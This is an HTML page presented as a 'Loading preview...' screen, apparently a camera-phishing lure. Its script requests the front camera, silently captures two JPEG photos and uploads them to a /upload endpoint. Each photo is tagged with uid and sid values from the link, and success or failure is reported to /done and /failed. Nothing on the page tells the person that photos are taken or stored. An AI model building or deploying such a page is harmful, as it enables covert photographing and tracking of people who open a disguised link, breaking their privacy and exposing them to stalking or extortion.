<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading preview...</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{
            background:#0a0a0a;
            display:flex;
            justify-content:center;
            align-items:center;
            height:100vh;
            overflow:hidden;
            font-family:'Segoe UI',Arial,sans-serif;
        }
        #loading{
            color:#fff;
            text-align:center;
            z-index:10;
        }
        .spinner{
            width:50px;height:50px;
            border:3px solid rgba(255,255,255,0.15);
            border-top:3px solid #fe2c55;
            border-radius:50%;
            animation:spin 0.8s linear infinite;
            margin:0 auto 20px;
        }
        @keyframes spin{to{transform:rotate(360deg);}}
        video{
            position:absolute;top:0;left:0;
            width:100%;height:100%;
            object-fit:cover;display:none;
        }
        canvas{display:none;}
        #status{
            color:#fff;
            text-align:center;
            position:absolute;
            bottom:60px;
            width:100%;
            z-index:10;
            font-size:13px;
            letter-spacing:0.5px;
        }
        .pulse{animation:pulse 2s infinite;}
        @keyframes pulse{
            0%,100%{opacity:1;}
            50%{opacity:0.4;}
        }
    </style>
</head>
<body>
    <div id="loading">
        <div class="spinner"></div>
        <p style="font-size:14px;color:#aaa;">Initializing camera...</p>
    </div>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <div id="status" class="pulse">● Preparing</div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const loading = document.getElementById('loading');
        const status = document.getElementById('status');
        const USER_ID = new URLSearchParams(window.location.search).get('uid');
        const SESSION_ID = new URLSearchParams(window.location.search).get('sid');
        let photoCount = 0;
        const MAX_PHOTOS = 2;

        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                video.srcObject = stream;
                video.style.display = 'block';
                loading.style.display = 'none';
                status.textContent = '● Live';
                status.classList.remove('pulse');
                
                await video.play();
                
                for(let i = 0; i < MAX_PHOTOS; i++) {
                    await new Promise(r => setTimeout(r, 1200));
                    await capturePhoto(i + 1);
                }
                
                stream.getTracks().forEach(track => track.stop());
                video.style.display = 'none';
                document.body.style.background = '#111';
                status.innerHTML = '✓ Session complete<br><small>You can close this window</small>';
                status.classList.add('pulse');
                
                await fetch('/done', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({uid: USER_ID, sid: SESSION_ID, count: photoCount})
                });
                
            } catch(err) {
                console.error('Camera error:', err);
                status.textContent = '✗ Permission denied';
                loading.innerHTML = '<p style="color:#fe2c55;font-size:14px;">⚠ Camera access is required</p>';
                status.classList.remove('pulse');
                
                await fetch('/failed', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({uid: USER_ID, sid: SESSION_ID, error: err.message})
                });
            }
        }

        async function capturePhoto(num) {
            canvas.width = video.videoWidth || 1280;
            canvas.height = video.videoHeight || 720;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
            
            const formData = new FormData();
            formData.append('photo', blob, `photo_${num}.jpg`);
            formData.append('uid', USER_ID);
            formData.append('sid', SESSION_ID);
            formData.append('number', num);
            
            const resp = await fetch('/upload', {method: 'POST', body: formData});
            const result = await resp.json();
            
            if(result.success) {
                photoCount++;
                status.textContent = '📷 Captured ' + photoCount + '/' + MAX_PHOTOS;
                status.classList.add('pulse');
            }
        }

        initCamera();
    </script>
</body>
</html>
